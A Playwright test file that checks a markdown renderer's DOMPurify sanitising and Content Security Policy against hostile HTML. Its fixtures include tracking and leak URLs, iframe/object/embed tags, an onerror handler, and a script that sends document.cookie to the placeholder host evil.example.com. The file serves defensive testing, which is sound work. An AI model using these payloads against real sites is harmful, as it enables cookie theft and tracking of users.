// Hostile-content fixture: M1.S1 (CSP) + M1.S2 (DOMPurify style url() filter).
//
// Loads the harness, sanitizes a hostile markdown-derived HTML string that
// tries to phone home through (a) inline style url(), (b) image src to a
// remote host, (c) stylesheet @import. Asserts:
//   1. The hostile attributes are stripped by DOMPurify.
//   2. NO network egress occurred (CSP connect-src 'none' + harness fetch/XHR
//      patches caught any attempt).
//   3. The renderer continues to function (legit content still rendered).
//
// Closes: SEC-007 / FR-06 / NFR-04 / SR-04 (CSP) and SEC-003 / FR-05 / SR-03
// (DOMPurify style hardening).
import { test, expect } from "@playwright/test";
import { fileURLToPath } from "url";
import { dirname, resolve } from "path";
import { readFileSync } from "fs";

const __dirname = dirname(fileURLToPath(import.meta.url));
const harnessUrl = `file://${resolve(__dirname, "..", "..", "harness", "renderer-harness.html")}`;
const dompurifyPath = resolve(__dirname, "..", "..", "..", "node_modules", "dompurify", "dist", "purify.min.js");

test("CSP + DOMPurify strip hostile style url() and block egress", async ({ page }) => {
	await page.goto(harnessUrl);

	// Inject DOMPurify — we ship the npm package's UMD bundle into the page
	// so the test runs the same DOMPurify the app ships with.
	const dompurifySource = readFileSync(dompurifyPath, "utf8");
	await page.addScriptTag({ content: dompurifySource });

	// Render a hostile HTML payload through the harness.
	const result = await page.evaluate(() => {
		const DP = (window as unknown as { DOMPurify: typeof import("dompurify") }).DOMPurify;
		const harness = (window as unknown as { __mdvHarness: { install: (d: unknown) => void; renderMarkdown: (h: string, d: unknown) => unknown; snapshot: () => unknown } }).__mdvHarness;
		harness.install(DP);
		const hostile = `
			<p>Legit content above.</p>
			<p style="background: url(http://evil.example.com/track.png); color: red;">tracker</p>
			<style>@import url(http://evil.example.com/sneaky.css);</style>
			<img src="http://evil.example.com/leak.gif" alt="hostile">
			<p>Legit content below.</p>
		`;
		return harness.renderMarkdown(hostile, DP);
	});

	// Wait a tick so any deferred fetches register
	await page.waitForTimeout(200);

	const snap = await page.evaluate(() => (window as unknown as { __mdvHarness: { snapshot: () => unknown } }).__mdvHarness.snapshot());
	const snapshot = snap as { cspViolations: { blockedURI: string; violatedDirective: string }[]; networkAttempts: { url: string }[]; contentHTML: string };

	// 1. Style url() was stripped by the DOMPurify hook
	expect(snapshot.contentHTML).not.toMatch(/url\s*\(http:\/\/evil/i);
	// 2. <style>@import is stripped by FORBID_TAGS (style is not in ADD_TAGS)
	expect(snapshot.contentHTML.toLowerCase()).not.toContain("@import");
	// 3. Image src to remote host is preserved AS A STRING (DOMPurify allows
	//    img and src), but the actual fetch is BLOCKED by CSP img-src 'self' data:
	//    AND/OR the harness's fetch patch records no egress.
	const remoteEgress = snapshot.networkAttempts.filter((a) => a.url.includes("evil.example.com"));
	expect(remoteEgress).toHaveLength(0);
	// 4. CSP violation events fire for the blocked image (Chrome reports them
	//    via securitypolicyviolation event). At minimum, we expect img-src or
	//    connect-src directives to fire.
	const directives = snapshot.cspViolations.map((v) => v.violatedDirective);
	expect(directives.length).toBeGreaterThan(0);

	// 5. Legit content is still in the DOM (renderer continues to function)
	expect(snapshot.contentHTML).toContain("Legit content above");
	expect(snapshot.contentHTML).toContain("Legit content below");
});

test("hostile <iframe> and <object> are stripped", async ({ page }) => {
	await page.goto(harnessUrl);
	const dompurifySource = readFileSync(dompurifyPath, "utf8");
	await page.addScriptTag({ content: dompurifySource });

	const snapshot = await page.evaluate(() => {
		const DP = (window as unknown as { DOMPurify: typeof import("dompurify") }).DOMPurify;
		const harness = (window as unknown as { __mdvHarness: { install: (d: unknown) => void; renderMarkdown: (h: string, d: unknown) => unknown; snapshot: () => unknown } }).__mdvHarness;
		harness.install(DP);
		harness.renderMarkdown(`
			<p>Before</p>
			<iframe src="http://evil.example.com"></iframe>
			<object data="http://evil.example.com/x.swf"></object>
			<embed src="http://evil.example.com/x.swf">
			<p>After</p>
		`, DP);
		return harness.snapshot();
	}) as { contentHTML: string; networkAttempts: { url: string }[] };

	expect(snapshot.contentHTML.toLowerCase()).not.toContain("<iframe");
	expect(snapshot.contentHTML.toLowerCase()).not.toContain("<object");
	expect(snapshot.contentHTML.toLowerCase()).not.toContain("<embed");
	expect(snapshot.contentHTML).toContain("Before");
	expect(snapshot.contentHTML).toContain("After");
	expect(snapshot.networkAttempts.filter((a) => a.url.includes("evil.example.com"))).toHaveLength(0);
});

test("script tags are stripped (markdown-it html:true relies on DOMPurify)", async ({ page }) => {
	await page.goto(harnessUrl);
	const dompurifySource = readFileSync(dompurifyPath, "utf8");
	await page.addScriptTag({ content: dompurifySource });

	const snapshot = await page.evaluate(() => {
		const DP = (window as unknown as { DOMPurify: typeof import("dompurify") }).DOMPurify;
		const harness = (window as unknown as { __mdvHarness: { install: (d: unknown) => void; renderMarkdown: (h: string, d: unknown) => unknown; snapshot: () => unknown } }).__mdvHarness;
		harness.install(DP);
		harness.renderMarkdown(`
			<p>Above</p>
			<script>fetch('http://evil.example.com/?c='+document.cookie)</script>
			<p onerror="fetch('http://evil.example.com')">handlers</p>
			<p>Below</p>
		`, DP);
		return harness.snapshot();
	}) as { contentHTML: string; networkAttempts: { url: string }[] };

	expect(snapshot.contentHTML.toLowerCase()).not.toContain("<script");
	expect(snapshot.contentHTML.toLowerCase()).not.toContain("onerror");
	expect(snapshot.networkAttempts.filter((a) => a.url.includes("evil.example.com"))).toHaveLength(0);
});
